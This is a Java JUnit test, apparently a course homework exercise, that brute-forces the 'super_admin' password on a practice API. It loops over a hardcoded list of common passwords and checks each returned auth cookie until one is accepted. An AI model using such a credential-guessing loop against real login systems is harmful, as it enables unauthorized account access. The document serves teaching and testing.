import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class HelloWorldTest {

    @Test
    public void testRestAssured() {
        Map<String, String> userAuth = new HashMap<>();
        userAuth.put("login", "super_admin");
        List<String> passwords = Arrays.asList("password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123",
                "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball",
                "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "welcome", "login", "admin", "trustno1",
                "solo", "1q2w3e4r", "master", "sunshine", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley",
                "123123", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "shadow",
                "lovely", "letmein", "passw0rd", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman",
                "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty",
                "loveme", "whatever", "donald", "batman", "zaq1zaq1", "qazwsx", "Football", "000000", "123qwe");
        Response response;
        String responseCookie;
        String responseBody;
        int i = 0;

        do {
            userAuth.put("password", passwords.get(i));
            i++;
            response = RestAssured
                    .given()
                    .body(userAuth)
                    .post("https://playground.learnqa.ru/api/get_secret_password_homework")
                    .andReturn();
            responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);

            response = RestAssured
                    .given()
                    .cookies(cookies)
                    .get("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

            responseBody = response.getBody().asPrettyString();
            if (i==passwords.size()) {break;}
        } while (responseBody.contains("You are NOT authorized"));
        System.out.println("You password: " + userAuth.get("password"));
        response.prettyPrint();
    }
}
